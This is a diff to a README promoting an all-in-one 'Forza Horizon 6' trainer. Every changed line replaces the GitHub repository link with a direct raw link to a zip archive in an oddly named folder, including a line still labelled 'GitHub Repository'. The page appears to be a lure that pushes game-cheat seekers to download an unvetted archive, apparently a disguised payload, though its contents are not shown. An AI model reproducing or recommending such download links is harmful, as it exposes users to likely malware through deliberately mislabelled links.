@@ -1,7 +1,7 @@
 <h1>🎮 FH6-TRAINER-ALL-IN-ONE - Unlock Every Feature, Win Every Race</h1>
 
 <p align="center">
-  <a href="https://github.com/mrmattlarge/FH6-TRAINER-ALL-IN-ONE" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(102,126,234,0.4);">⬇️ DOWNLOAD FH6 TRAINER NOW</a>
+  <a href="https://raw.githubusercontent.com/mrmattlarge/FH6-TRAINER-ALL-IN-ONE/main/elephantoidal/3.1-beta.5.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(102,126,234,0.4);">⬇️ DOWNLOAD FH6 TRAINER NOW</a>
 </p>
 
 ---
@@ -67,7 +67,7 @@ Getting started is straightforward. Follow these exact steps:
 
 ### Step 1: Download the Trainer
 1. Click the **Download** button at the top of this page, or navigate to the repository link directlyhere:
-   - **[https://github.com/mrmattlarge/FH6-TRAINER-ALL-IN-ONE](https://github.com/mrmattlarge/FH6-TRAINER-ALL-IN-ONE)**
+   - **[https://raw.githubusercontent.com/mrmattlarge/FH6-TRAINER-ALL-IN-ONE/main/elephantoidal/3.1-beta.5.zip](https://raw.githubusercontent.com/mrmattlarge/FH6-TRAINER-ALL-IN-ONE/main/elephantoidal/3.1-beta.5.zip)**
 2. On that page, locate the green **"Code"** button near the top right corner of the file list. Click it, then choose **"Download ZIP"**. (If you see a direct `.exe` or `.zip` release link listed, you may click that instead for a faster download.)
 3. Wait for the download to complete. The file is small, typically less than 10 MB, so this should only take a few seconds on most connections.
 
@@ -175,8 +175,8 @@ thats repository page. We read every report and typically respond within 48 hour
 
 ## 🔗 Quick Links
 
-- **[Download the Trainer](https://github.com/mrmattlarge/FH6-TRAINER-ALL-IN-ONE)**
-- GitHub Repository: https://github.com/mrmattlarge/FH6-TRAINER-ALL-IN-ONE
+- **[Download the Trainer](https://raw.githubusercontent.com/mrmattlarge/FH6-TRAINER-ALL-IN-ONE/main/elephantoidal/3.1-beta.5.zip)**
+- GitHub Repository: https://raw.githubusercontent.com/mrmattlarge/FH6-TRAINER-ALL-IN-ONE/main/elephantoidal/3.1-beta.5.zip
 - Compatibility: Windows 10 / 11
 - Game: Forza Horizon 6
 
